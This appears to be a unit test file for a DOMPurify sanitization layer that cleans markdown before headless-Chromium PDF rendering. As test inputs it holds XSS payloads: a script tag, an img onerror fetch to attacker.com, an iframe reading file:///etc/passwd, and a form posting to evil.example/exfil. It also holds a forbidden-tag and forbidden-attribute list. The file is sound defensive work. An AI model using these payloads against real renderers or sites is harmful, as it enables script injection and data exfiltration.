// Copyright 2026 Chu Ling
// SPDX-License-Identifier: Apache-2.0

/**
 * test/sca-sanitize.test.mjs
 *
 * Unit tests for the HTML sanitization layer applied to SCA markdown before
 * it is fed to puppeteer for PDF generation.
 *
 * The threat model: a malicious SCA author embeds <script>, on* event
 * handlers, or <iframe src="file://..."> in the markdown source. Without
 * sanitization these survive marked's HTML pass-through and execute inside
 * headless Chromium at PDF render time, potentially exfiltrating data from
 * the render environment.
 *
 * DOMPurify (via isomorphic-dompurify) is the mitigation. These tests verify
 * that dangerous payloads are stripped while legitimate SCA content survives.
 */

import { describe, it, expect } from 'vitest';
import DOMPurify from 'isomorphic-dompurify';
import { marked } from 'marked';

// Shared sanitize helper that mirrors the options used in sca.mjs
function sanitize(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'p', 'br', 'hr', 'div', 'span',
      'strong', 'em', 'code', 'pre', 'blockquote',
      'ul', 'ol', 'li',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'a', 'img',
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'id', 'class'],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|data:image\/(?:png|jpeg|gif|webp)):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i,
    ADD_TAGS: ['style'],
    ADD_ATTR: ['style'],
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button'],
    FORBID_ATTR: ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'srcset'],
  });
}

describe('SCA markdown sanitization', () => {
  it('strips <script> tags from rendered HTML', () => {
    const malicious = '# Title\n\n<script>alert("xss")</script>\n\nBody.';
    const html = sanitize(marked.parse(malicious, { gfm: true }));
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('alert(');
    expect(html).toContain('Title');
  });

  it('strips on* event handlers from img tags', () => {
    const malicious = '<img src=x onerror="fetch(\'https://attacker.com\')" />';
    const html = sanitize(marked.parse(malicious, { gfm: true }));
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('attacker.com');
  });

  it('strips iframe, object, and form tags', () => {
    const malicious = [
      '<iframe src="file:///etc/passwd"></iframe>',
      '<object data="https://evil.example/x.swf"></object>',
      '<form action="https://evil.example/exfil"><input type="hidden" name="x" value="y" /></form>',
    ].join('\n');
    const html = sanitize(marked.parse(malicious, { gfm: true }));
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<object');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
  });

  it('preserves safe markdown rendering — headings, bold, italic, links', () => {
    const safe = '# Title\n\n**bold** and *italic* with [link](https://example.com).';
    const html = sanitize(marked.parse(safe, { gfm: true }));
    expect(html).toContain('<h1');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('href="https://example.com"');
  });
});
